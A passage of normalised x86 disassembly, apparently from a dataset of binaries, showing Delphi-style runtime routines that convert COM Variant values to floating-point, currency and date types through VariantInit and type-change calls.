fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441140
lea eax [ ebp - 0x18 ]
call sub_43ef08
retn
sub_441148
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_441194
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4411b0 ]
mov eax ebx
call sub_440fd4
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_440fd4
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_441194
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_441098
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4410e4
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_43e6b8
mov eax ebx
call sub_440fd4
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_441148
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_441098
fstp [ esp ]
fwait
mov eax ebx
call sub_441098
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4413cc ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_440fd4
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_441194
fstp [ esp ]
fwait
jmp r-xdata
sub_4415a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x15
ja r-xdata
xor eax eax
push ebp
push sub_441733
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441194
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4415c2 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
sub edx 0x80000000
mov [ ebp - 0x10 ] edx
fild [ ebp - 0x14 ]
fadd [ r-xdata ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_43e6b8
sub_441764
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_441840
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_442f38
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x10 ]
call sub_4390d4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441847
lea eax [ ebp - 0x20 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_437350
test al al
je r-xdata
movzx edx [ ebx ]
mov cx 0x7
call sub_43eb4c
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_43eb4c
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_441850
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_43eb4c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4418b0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x7
call sub_43eb4c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4418fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_441951
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_43f250
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4419ac
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441958
lea eax [ ebp - 0x18 ]
call sub_43ef08
retn
sub_441960
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4419ac
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4419c8 ]
mov eax ebx
call sub_441764
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4418b0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_441764
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441850
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441850
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4419ac
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4418b0
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4418fc
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_43e6b8
mov eax ebx
call sub_441764
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_441960
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_4418b0
fstp [ esp ]
fwait
mov eax ebx
call sub_4418b0
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_441be0 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4418b0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_441764
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441850
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441850
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4419ac
fstp [ esp ]
fwait
jmp r-xdata
sub_441d90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_441e3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_442f38
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_437430
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e43
lea eax [ ebp - 0x14 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
movzx edx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_43eb4c
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x6
call sub_43eb4c
jmp r-xdata
sub_441e4c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_43eb4c
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_441eac
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x6
call sub_43eb4c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_441ef8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_441f4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_43f250
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_441fa8
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441f54
lea eax [ ebp - 0x18 ]
call sub_43ef08
retn
sub_441f5c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_441fa8
push ebx
add esp 0xffffffec
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_441fc4 ]
mov eax ebx
call sub_441d90
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_441d90
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441e4c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441e4c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_441fa8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_441ef8
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_43e6b8
mov eax ebx
call sub_441d90
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_441f5c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_442216 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_441eac
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_441d90
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441e4c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
sub edx 0x80000000
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fadd [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_441e4c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_441fa8
fistp [ esp ]
fwait
jmp r-xdata
sub_442404
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4499d8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_43eb4c
pop ebx
pop ebp
retn 0x8
sub_44243c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4499d8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_43eb4c
pop ebx
pop ebp
retn 0x8
sub_442474
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44252c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4499d8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_43eb4c
movzx eax [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442533
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_449f7c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_434d40
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_449f90
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_449f7c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_434c78
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_449f90
jmp r-xdata
jmp r-xdata
call sub_43e754
sub_44253c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4425e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4425c9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
